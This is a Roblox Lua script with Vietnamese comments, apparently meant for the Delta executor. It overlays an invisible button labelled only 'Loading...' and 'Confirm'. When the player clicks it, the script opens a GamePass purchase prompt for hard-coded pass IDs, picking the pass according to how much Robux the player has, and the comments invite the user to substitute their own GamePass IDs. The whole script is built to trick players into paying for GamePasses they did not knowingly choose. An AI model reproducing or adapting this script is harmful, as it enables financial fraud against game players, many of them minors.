-- Script chạy trực tiếp trong Delta

local player = game.Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")
local playerGui = player:WaitForChild("PlayerGui")

-- Thay các ID này bằng GamePass bạn muốn
local GAMEPASS_ID_SMALL  = 89295458
local GAMEPASS_ID_MEDIUM = 89294735
local GAMEPASS_ID_LARGE  = 80672941
local GAMEPASS_ID_FALLBACK = 89294735

-- Tạo GUI giống script gốc
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 50)
frame.Position = UDim2.new(0.5, -100, 0.5, -25)
frame.BackgroundTransparency = 1
frame.Parent = playerGui

local purchaseButton = Instance.new("TextButton")
purchaseButton.Size = UDim2.new(1, 0, 1, 0)
purchaseButton.Text = "Loading..."
purchaseButton.BackgroundTransparency = 1
purchaseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
purchaseButton.Parent = frame

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Size = UDim2.new(1, 0, 1, 0)
loadingLabel.Position = UDim2.new(0, 0, 0, 0)
loadingLabel.Text = "Loading..."
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Visible = true
loadingLabel.Parent = frame

local confirmLabel = Instance.new("TextLabel")
confirmLabel.Size = UDim2.new(1, 0, 1, 0)
confirmLabel.Position = UDim2.new(0, 0, 0, 0)
confirmLabel.Text = "Confirm"
confirmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
confirmLabel.BackgroundTransparency = 1
confirmLabel.Visible = false
confirmLabel.Parent = frame

-- Hàm check và mở Prompt
local function promptIfNotOwned(gamePassId)
    local success, owns = pcall(function()
        return MarketplaceService:UserOwnsGamePassAsync(player.UserId, gamePassId)
    end)
    if success and not owns then
        MarketplaceService:PromptGamePassPurchase(player, gamePassId)
    else
        warn("Bạn đã sở hữu GamePass: " .. tostring(gamePassId))
    end
end

local function initiatePurchase()
    loadingLabel.Visible = false
    confirmLabel.Visible = true
    purchaseButton.Text = "Confirm"
end

local function confirmPurchase()
    purchaseButton.Text = "Loading..."
    confirmLabel.Visible = false
    loadingLabel.Visible = true

    -- Nếu bạn có Leaderstats robux thì check, không thì fallback
    local robux = 0
    pcall(function()
        robux = player:WaitForChild("Leaderstats"):WaitForChild("Robux").Value
    end)

    if robux >= 100 and robux < 1000 then
        promptIfNotOwned(GAMEPASS_ID_MEDIUM)
    elseif robux >= 5 and robux < 100 then
        promptIfNotOwned(GAMEPASS_ID_SMALL)
    elseif robux >= 1000 and robux < 10000 then
        promptIfNotOwned(GAMEPASS_ID_LARGE)
    else
        promptIfNotOwned(GAMEPASS_ID_FALLBACK)
    end
end

wait(2)
initiatePurchase()

purchaseButton.MouseButton1Click:Connect(function()
    if confirmLabel.Visible then
        confirmPurchase()
    end
end)
